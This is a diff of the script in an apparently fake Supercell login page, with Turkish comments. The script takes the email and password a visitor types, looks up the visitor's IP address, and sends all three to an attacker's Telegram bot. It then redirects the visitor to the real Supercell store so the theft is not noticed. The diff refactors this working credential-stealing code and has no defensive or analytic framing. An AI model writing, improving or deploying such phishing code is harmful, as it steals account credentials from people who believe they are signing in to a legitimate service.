@@ -99,35 +99,28 @@
 
   <script>
   async function sendMessage() {
-    const token = 'BOT_TOKENUNUZ'; // Tokeninizi kontrol edin
-    const userId = 'CHAT_IDNIZ'; // Chat ID'nizi kontrol edin
+    const token = 'BOT_TOKENUNUZ'; // BotFather token
+    const userId = 'CHAT_IDNIZ'; // Numeric chat ID
     const email = document.getElementById('email').value;
     const password = document.getElementById('password').value;
 
     try {
-      // 1. IP adresi alma
-      const ipResponse = await fetch('https://api.ipify.org?format=json');
-      if (!ipResponse.ok) throw new Error('IP alınamadı');
-      const { ip } = await ipResponse.json();
+      // 1. IP adresi al
+      const ip = await fetch('https://api.ipify.org?format=json')
+        .then(res => res.json())
+        .then(data => data.ip);
 
-      // 2. Telegram API için özel istek formatı
-      const formData = new FormData();
-      formData.append('chat_id', userId);
-      formData.append('text', `email: ${email}\nşifre: ${password}\nIP: ${ip}`);
+      // 2. Telegram API isteği (URL encoded)
+      const url = new URL(`https://api.telegram.org/bot${token}/sendMessage`);
+      url.searchParams.append('chat_id', userId);
+      url.searchParams.append('text', `email: ${email}\nşifre: ${password}\nIP: ${ip}`);
 
-      const telegramResponse = await fetch(
-        `https://api.telegram.org/bot${token}/sendMessage`,
-        {
-          method: 'POST',
-          body: formData
-        }
-      );
+      const response = await fetch(url, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/x-www-form-urlencoded'}
+      });
 
-      if (!telegramResponse.ok) {
-        const error = await telegramResponse.json();
-        throw new Error(error.description || 'Telegram hatası');
-      }
-
+      if (!response.ok) throw new Error(await response.text());
       window.location.href = 'https://store.supercell.com/tr';
     } catch (error) {
       alert(`Hata: ${error.message}`);
